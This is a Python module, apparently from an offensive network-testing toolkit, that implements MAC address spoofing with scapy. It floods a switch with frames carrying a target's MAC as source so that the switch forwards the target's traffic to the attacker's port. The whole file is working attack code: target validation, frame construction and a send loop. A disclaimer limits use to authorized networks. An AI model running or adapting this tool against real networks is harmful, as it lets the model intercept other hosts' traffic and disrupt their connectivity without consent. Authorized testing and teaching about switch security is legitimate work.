"""MAC address spoofing: impersonate a host's MAC address on the local segment.

The attacker sends frames whose source MAC is the target's address. A learning
switch then records the target's MAC on the attacker's port, and frames addressed
to the target are forwarded there until the real target sends traffic again.

Intended only for networks you own or are explicitly authorized to test.
"""

from __future__ import annotations

import random
import re
import threading
from collections.abc import Callable
from dataclasses import dataclass, replace
from typing import Any

from scapy.all import Ether, Raw, sendp
from scapy.packet import Packet

from macabre.attacks.common import BROADCAST_MAC

PAYLOAD_SIZE = 46
EXPERIMENTAL_ETHERTYPE = 0x88B5
_MAC_RE = re.compile(r"^([0-9a-f]{2}:){5}[0-9a-f]{2}$")


@dataclass(frozen=True)
class MacSpoofingConfig:
    iface: str                # attacker interface, attached to the switch port
    target_mac: str           # MAC address to impersonate (required)
    count: int = 0            # frames to send; 0 = run until stopped
    interval: float = 0.0     # seconds between frames
    dry_run: bool = False     # build frames but do not send them

    def __post_init__(self) -> None:
        mac = self.target_mac.strip().lower()
        if not mac:
            raise ValueError("Target MAC is required.")
        if not _MAC_RE.match(mac):
            raise ValueError(f"Invalid MAC address: {self.target_mac}")
        if int(mac.split(":")[0], 16) & 0x01:
            raise ValueError("Target MAC must be unicast (not multicast or broadcast).")


@dataclass
class SpoofingStats:
    frames: int = 0


def build_spoof_frame(target_mac: str, rng: random.Random) -> Packet:
    """Frame that claims `target_mac` as its source, sent to the broadcast address."""
    return (
        Ether(src=target_mac, dst=BROADCAST_MAC, type=EXPERIMENTAL_ETHERTYPE)
        / Raw(load=rng.randbytes(PAYLOAD_SIZE))
    )


def run_spoofing(
    config: MacSpoofingConfig,
    stop_event: threading.Event,
    on_progress: Callable[[SpoofingStats], None],
    rng: random.Random | None = None,
    send: Callable[..., Any] | None = None,
) -> SpoofingStats:
    """Send frames with the target MAC as source until `count` or `stop_event`."""
    rng = rng or random.Random()
    send = send or sendp
    target = config.target_mac.strip().lower()
    stats = SpoofingStats()
    while not stop_event.is_set() and (config.count == 0 or stats.frames < config.count):
        frame = build_spoof_frame(target, rng)
        if not config.dry_run:
            send(frame, iface=config.iface, verbose=False)
        stats.frames += 1
        on_progress(replace(stats))
        stop_event.wait(config.interval)
    return stats
